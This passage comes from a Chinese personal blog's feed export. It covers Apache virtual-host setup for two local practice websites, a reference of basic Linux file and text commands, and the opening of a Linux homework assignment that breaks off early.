class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">4px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">3rem</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation</span>: fadeIn <span class="number">1.5s</span> ease-in-out;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="keyword">@keyframes</span> fadeIn &#123;</span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">from</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">20px</span>);</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">to</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">opacity</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎来到HacerkT的世界<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>保存好之后，访问一下静态页面</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看一下自己的ip地址</span></span><br><span class="line">ifconfig</span><br><span class="line"><span class="comment">#然后用浏览器直接访问ip地址，成功访问之后证明网站搭建完毕</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250804161900808.png"></p><p>到此，网站已经搭建完毕！</p><h2 id="5-搭建第二网站"><a href="#5-搭建第二网站" class="headerlink" title="5.搭建第二网站"></a>5.搭建第二网站</h2><p>搭建第二网站需要运用到apache的一个核心功能，虚拟主机，他允许单台服务器通过不同ip、域名、端口托管多个不同网站</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三种方式</span><br><span class="line">基于域名：不同域名访问不同网站，如a.com和b.com</span><br><span class="line">基于ip：不同ip访问不同网站，如http://10.1.1.1和http://10.1.1.2</span><br><span class="line">基于端口：不同端口访问不同网站，如http://10.1.1.1:81和http://10.1.1.1:82</span><br></pre></td></tr></table></figure><p>这里我们使用域名来搭建第二网站</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建新的网站目录和日志目录，在/var/www下创建，例如/var/www/study/html和/var/www/study/log</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /var/www/study/html /var/www/study/log</span><br><span class="line"></span><br><span class="line"><span class="comment">#新建日志文件，错误日志study_error.log和访问日志study_access.log</span></span><br><span class="line"><span class="built_in">touch</span> /var/www/study/log/study_error.log /var/www/study/log/study_access.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改配置文件，路径为/etc/httpd/conf.d目录下，创建一个新的配置文件，例如study.conf</span></span><br><span class="line">vim /etc/httpd/conf.d/study.conf</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">ServerName study.com <span class="comment"># 主域名</span></span><br><span class="line">ServerAlias study1.com <span class="comment"># 备用域名</span></span><br><span class="line">DocumentRoot /var/www/study/html <span class="comment"># 网站根目录</span></span><br><span class="line">ErrorLog /var/www/study/log/study_error.log <span class="comment"># 错误日志</span></span><br><span class="line">CustomLog /var/www/study/log/study_access.log combined <span class="comment"># 访问日志</span></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"><span class="comment">#需要注意，在配置文件的时候，不能加上#的内容，例如#主域名，这个要删除</span></span><br></pre></td></tr></table></figure><p>做完这些之后，写第二网站的静态页面，同之前一样，但这里注意网站的路径为&#x2F;var&#x2F;www&#x2F;study&#x2F;html，所以html文件保存在这个路径下，以下是我第二个网页的代码</p><p>这里需要注意一下，需要配置属主属组为apache，并配置权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chown</span> apache:apache /var/www/study/html/index.html</span><br><span class="line"><span class="built_in">chmod</span> 755 /var/www/study/html/index.html</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>网络安全学习路线基础篇<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-pseudo">:root</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attr">--primary-color</span>: <span class="number">#2c3e50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attr">--secondary-color</span>: <span class="number">#3498db</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attr">--background-color</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attr">--card-bg</span>: <span class="number">#ffffff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attr">--text-color</span>: <span class="number">#333333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Segoe UI&#x27;</span>, Tahoma, Geneva, Verdana, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="built_in">var</span>(--background-color);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">var</span>(--text-color);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">1.6</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">var</span>(--primary-color);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">2.5rem</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">4px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.module</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="built_in">var</span>(--card-bg);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">4px</span> <span class="number">6px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: transform <span class="number">0.3s</span> ease;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.module</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">5px</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.module</span> <span class="selector-tag">h2</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">var</span>(--secondary-color);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="built_in">var</span>(--secondary-color);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">ul</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">list-style-type</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">8px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">li</span><span class="selector-pseudo">:last-child</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-bottom</span>: none;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>网络安全学习路线基础篇<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;module&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1. 操作系统基础<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>Windows<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>Linux<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;module&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>2. 计算机网络基础<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>网络设备<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>协议<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>数据包<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;module&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>3. 数据库基础<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>MySQL<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>MSSQL<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>Redis<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;module&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>4. 代码基础<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>PHP<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>Python<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>Java<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里出现几个问题，当我们使用域名study.com访问的时候，访问的是其他的网站</p><p>这里做了域名解析</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250804181159993.png"></p><p>可以看到是其他ip，原因可能是因为在浏览器解析域名的时候是公网的DNS服务器，所以无法定位到你的虚拟机，但是可以通过命令行进行访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Host: study.com&quot; http://192.168.xx.xx/</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250804181518614.png"></p><p>成功访问！证明我们的配置没有问题</p><p>还有一个问题是，在浏览器上使用ip进行访问的时候，访问的是第二网页，那么我们之前通过ip访问的第一网页去哪了呢？？？？？</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250804181718943.png"></p><p>原因是因为你在apache上开启了虚拟主机这个配置，并且配置了域名，让你的ip有了一个指向，目标就是你的域名，所以它会自动将域名和ip绑定，访问的路径自然就是你第二网页的路径&#x2F;var&#x2F;www&#x2F;study&#x2F;heml而不是默认网页&#x2F;var&#x2F;www&#x2F;html，所以就造成了当浏览器输入IP进行访问的时候，访问的是你的第二网页。</p><p>那有什么办法能访问到两个网页呢？？？？</p><p>当然有，这需要做一个配置，新建一个虚拟配置文件，让这个配置文件指向你的默认页面</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">新建一个index.conf的配置文件，在/etc/httpd/conf.d/目录下</span><br><span class="line">vim /etc/httpd/conf.d/index.conf</span><br><span class="line"></span><br><span class="line">保存一下内容</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    <span class="comment"># 使用通配符&quot;_&quot;表示默认主机</span></span><br><span class="line">    ServerName _</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 明确指向Apache的默认目录</span></span><br><span class="line">    DocumentRoot /var/www/html</span><br><span class="line"></span><br><span class="line">    &lt;Directory <span class="string">&quot;/var/www/html&quot;</span>&gt;</span><br><span class="line">        Options -Indexes +FollowSymLinks</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Require all granted</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>配置好后，编辑你的物理机的”C:\Windows\System32\drivers\etc\hosts”配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在末尾加上</span><br><span class="line"></span><br><span class="line">192.168.x.x  study.com www.study.com</span><br><span class="line"></span><br><span class="line">192.168.x.x是你虚拟机服务器的ip地址</span><br></pre></td></tr></table></figure><p>配置完成之后，去浏览器清理dns缓存，直接ctrl+shift+delete</p><p>然后在命令行里输入，ipconfig &#x2F;flushdns，刷新dns解析缓存</p><p>然后再次尝试在浏览器通过域名和ip进行访问</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250805110853545.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250805110927235.png"></p><p>OK，成功解决，ip和域名访问不冲突，当然还有一些其他的解决方式，比如修改&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf文件</p><p>到此，本章内容结束！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>“Linux常用基础命令”</title>
      <link href="/2025/08/04/%E2%80%9CLinux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E2%80%9D/"/>
      <url>/2025/08/04/%E2%80%9CLinux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E2%80%9D/</url>
      
        <content type="html"><![CDATA[<h1 id="linux常用基础命令"><a href="#linux常用基础命令" class="headerlink" title="linux常用基础命令"></a>linux常用基础命令</h1><h2 id="一、文件管理与查询"><a href="#一、文件管理与查询" class="headerlink" title="一、文件管理与查询"></a>一、文件管理与查询</h2><h3 id="1-touch-创建文件"><a href="#1-touch-创建文件" class="headerlink" title="1.touch #创建文件"></a>1.touch #创建文件</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> test.txt  <span class="comment">#单个创建</span></span><br><span class="line"><span class="built_in">touch</span> test1.txt test2.txt  <span class="comment">#批量创建</span></span><br></pre></td></tr></table></figure><h3 id="2-mkdir-创建目录"><a href="#2-mkdir-创建目录" class="headerlink" title="2.mkdir #创建目录"></a>2.mkdir #创建目录</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> 【选项】 目录名</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">dir</span>/  <span class="comment">#单级创建</span></span><br><span class="line"><span class="built_in">mkdir</span> -p dir1/dir2  <span class="comment">#递归创建</span></span><br></pre></td></tr></table></figure><h3 id="3-rm-删除文件及目录"><a href="#3-rm-删除文件及目录" class="headerlink" title="3.rm #删除文件及目录"></a>3.rm #删除文件及目录</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> 【选项】 文件名or目录名</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> test.txt  <span class="comment">#删除单个文件</span></span><br><span class="line"><span class="built_in">rm</span> -r <span class="built_in">dir</span>/  <span class="comment">#删除整个目录及其以下所有内容</span></span><br><span class="line"><span class="built_in">rm</span> -f test.txt  <span class="comment">#强制删除</span></span><br></pre></td></tr></table></figure><h3 id="4-cp-复制文件或目录"><a href="#4-cp-复制文件或目录" class="headerlink" title="4.cp #复制文件或目录"></a>4.cp #复制文件或目录</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> 【选项】 文件名or目录名 指定路径</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> test.txt <span class="built_in">dir</span>/  <span class="comment">#将test.txt复制到dir/目录</span></span><br><span class="line"><span class="built_in">cp</span> -r dir1/ dir2/  <span class="comment">#将dir1递归复制到dir2</span></span><br><span class="line"><span class="built_in">cp</span> -f dir1/ dir2/  <span class="comment">#强制复制</span></span><br><span class="line"><span class="built_in">cp</span> -i test.txt dir1/  <span class="comment">#若有覆盖，提示确认</span></span><br></pre></td></tr></table></figure><h3 id="5-mv-移动文件或重命名"><a href="#5-mv-移动文件或重命名" class="headerlink" title="5.mv #移动文件或重命名"></a>5.mv #移动文件或重命名</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> 源文件 目标路径or名称</span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> old.txt nwe.txt  <span class="comment">#重命名</span></span><br><span class="line"><span class="built_in">mv</span> test.txt <span class="built_in">dir</span>/  <span class="comment">#移动test.txt到dir/目录</span></span><br></pre></td></tr></table></figure><h3 id="6-ls-查看目录"><a href="#6-ls-查看目录" class="headerlink" title="6.ls #查看目录"></a>6.ls #查看目录</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> 【选项】</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span>  <span class="comment">#查看当前目录下所有文件</span></span><br><span class="line"><span class="built_in">ls</span> -a  <span class="comment">#显示当前目录下的隐藏文件</span></span><br><span class="line"><span class="built_in">ls</span> -l  <span class="comment">#长格式显示，显示各文件权限、所属主/组、时间等</span></span><br><span class="line"><span class="built_in">ls</span> -h  <span class="comment">#人类可读的文件大小</span></span><br><span class="line"><span class="built_in">ls</span> -R  <span class="comment">#递归显示子目录</span></span><br></pre></td></tr></table></figure><h3 id="7-cat-查看文件"><a href="#7-cat-查看文件" class="headerlink" title="7.cat #查看文件"></a>7.cat #查看文件</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 【选项】 文件名</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> test.txt  <span class="comment">#查看test.txt文件的内容</span></span><br><span class="line"><span class="built_in">cat</span> test1.txt test2.txt  <span class="comment">#查看多个文件内容</span></span><br><span class="line"><span class="built_in">cat</span> test1.txt test2.txt &gt; test3.txt  <span class="comment">#合并文件 </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> -n  <span class="comment">#显示行号</span></span><br><span class="line"><span class="built_in">cat</span> -b  <span class="comment">#显示行号（忽略空行）</span></span><br><span class="line"><span class="built_in">cat</span> -s  <span class="comment">#压缩连续空行为一行</span></span><br><span class="line"><span class="built_in">cat</span> -E  <span class="comment">#在行尾显示$符号</span></span><br></pre></td></tr></table></figure><p>高阶用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">创建文件</span><br><span class="line"><span class="built_in">cat</span> &gt; test.txt &lt;&lt; <span class="string">EOF  #创建test.txt文件</span></span><br><span class="line"><span class="string">示例</span></span><br><span class="line"><span class="string">[root@localhost test]# cat &gt; test789.txt &lt;&lt;EOF</span></span><br><span class="line">&gt; qwer</span><br><span class="line">&gt; EOF</span><br><span class="line">[root@localhost <span class="built_in">test</span>]# <span class="built_in">cat</span> test789.txt </span><br><span class="line">qwer</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> test1.txt &gt; test2.txt  <span class="comment">#将test1的内容追加到test2末尾</span></span><br></pre></td></tr></table></figure><h3 id="8-tail-查看文件末尾内容"><a href="#8-tail-查看文件末尾内容" class="headerlink" title="8.tail #查看文件末尾内容"></a>8.tail #查看文件末尾内容</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> 【选项】 文件名</span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> test.txt  <span class="comment">#查看末尾10行内容</span></span><br><span class="line"><span class="built_in">tail</span> -n 20 test.txt  <span class="comment">#查看末尾20行，-n用于指定显示行数</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/message  <span class="comment">#实时追踪变化</span></span><br></pre></td></tr></table></figure><h3 id="9-grep-进行正则匹配文本内容"><a href="#9-grep-进行正则匹配文本内容" class="headerlink" title="9.grep #进行正则匹配文本内容"></a>9.grep #进行正则匹配文本内容</h3><p>用法：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep 【选项】 “搜索模式” 文件名or目录</span><br><span class="line"></span><br><span class="line">grep -i <span class="string">&quot;error&quot;</span> file  <span class="comment">#忽略大小写</span></span><br><span class="line">grep -v <span class="string">&quot;debug&quot;</span> file  <span class="comment">#反向匹配，排除搜索模式</span></span><br><span class="line">grep -n <span class="string">&quot;qwe&quot;</span> file  <span class="comment">#显示行号</span></span><br><span class="line">grep -c <span class="string">&quot;eqwe&quot;</span> file  <span class="comment">#统计行数</span></span><br><span class="line">grep -r <span class="string">&quot;123&quot;</span> /etc/  <span class="comment">#递归搜索目录</span></span><br><span class="line">grep -w <span class="string">&quot;qwe&quot;</span> file  <span class="comment">#精确匹配</span></span><br><span class="line">grep -o <span class="string">&quot;[0-9]&quot;</span> file  <span class="comment">#仅输出匹配内容</span></span><br><span class="line">grep -A 12 <span class="string">&quot;qwe&quot;</span> file  <span class="comment">#显示匹配行以及后12行 </span></span><br><span class="line">grep -B 14 <span class="string">&quot;qwe&quot;</span> file  <span class="comment">#显示匹配行以及前14行</span></span><br><span class="line">grep -C 18 <span class="string">&quot;qwe&quot;</span> file  <span class="comment">#显示匹配行以及前后各18行</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次linux实操作业</title>
      <link href="/2025/08/03/linux%E5%9F%BA%E7%A1%80%E5%A4%A7%E4%BD%9C%E4%B8%9Aw1/"/>
      <url>/2025/08/03/linux%E5%9F%BA%E7%A1%80%E5%A4%A7%E4%BD%9C%E4%B8%9Aw1/</url>
      
        <content type="html"><![CDATA[<h1 id="大作业要求"><a href="#大作业要求" class="headerlink" title="大作业要求"></a>大作业要求</h1><h4 id="1、不看笔记完成"><a href="#1、不看笔记完成" class="headerlink" title="1、不看笔记完成"></a>1、不看笔记完成</h4><h4 id="2、命令解释"><a href="#2、命令解释" class="headerlink" title="2、命令解释"></a>2、命令解释</h4><p>eg：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ddd<span class="comment">#ddd是干什么的</span></span><br></pre></td></tr></table></figure><h4 id="3、回显截图"><a href="#3、回显截图" class="headerlink" title="3、回显截图"></a>3、回显截图</h4><h2 id="实验1：文件目录结构与基本命令操作"><a href="#实验1：文件目录结构与基本命令操作" class="headerlink" title="实验1：文件目录结构与基本命令操作"></a>实验1：文件目录结构与基本命令操作</h2><p>1、在&#x2F;tmp目录下创建如下目录结构：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/tmp/test/</span><br><span class="line">├── dir1/</span><br><span class="line">│   ├── file1.txt</span><br><span class="line">│   └── file2.txt</span><br><span class="line">├── dir2/</span><br><span class="line">│   └── subdir/</span><br><span class="line">└── file3.txt</span><br></pre></td></tr></table></figure><p>①cd &#x2F;tmp 